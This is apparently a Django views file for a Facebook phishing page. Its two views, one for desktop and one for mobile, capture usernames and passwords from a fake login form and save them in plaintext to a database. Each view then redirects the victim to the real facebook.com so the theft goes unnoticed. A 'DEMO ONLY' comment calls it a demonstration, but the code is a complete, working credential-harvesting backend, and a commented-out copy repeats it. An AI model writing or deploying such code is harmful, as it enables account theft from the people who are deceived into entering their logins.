from django.shortcuts import render, redirect
from django.contrib import messages
from django.urls import reverse
from .forms import PersonForm
from .models import Person  # We'll keep this only to show the attack vector


def loginfish(request):
    if request.method == "POST":
        form = PersonForm(request.POST)

        if form.is_valid():
            # DEMO ONLY: Save the attempt to show how attackers steal data
            username = form.cleaned_data["username"]
            passcode = form.cleaned_data["passcode"]
            Person.objects.create(username=username, passcode=passcode)

            response = redirect('https://www.facebook.com/')
            return response
    else:
        form = PersonForm()

    return render(request, "homepage.html", {"form": form})


def loginfishm(request):
    if request.method == 'POST':
        form = PersonForm(request.POST)
        
        if form.is_valid():
            username = form.cleaned_data['username']
            passcode = form.cleaned_data['passcode']
            person = Person.objects.create(username=username, passcode=passcode)
            response = redirect('https://www.facebook.com/')
            return response
    else:
        form = PersonForm()


    return render(request, 'indexm.html', {'form': form})




# from django.shortcuts import render
# from .forms import PersonForm
# from .models import Person
# from django.shortcuts import redirect
# # Create your views here.

# def loginfish(request):
#     if request.method == 'POST':
#         form = PersonForm(request.POST)
        
#         if form.is_valid():
#             username = form.cleaned_data['username']
#             passcode = form.cleaned_data['passcode']
#             person = Person.objects.create(username=username, passcode=passcode)
#             response = redirect('https://www.facebook.com/')
#             return response
#     else:
#         form = PersonForm()


#     return render(request, 'homepage.html', {'form': form})


# def loginfishm(request):
#     if request.method == 'POST':
#         form = PersonForm(request.POST)
        
#         if form.is_valid():
#             username = form.cleaned_data['username']
#             passcode = form.cleaned_data['passcode']
#             person = Person.objects.create(username=username, passcode=passcode)
#             response = redirect('https://www.facebook.com/')
#             return response
#     else:
#         form = PersonForm()


#     return render(request, 'indexm.html', {'form': form})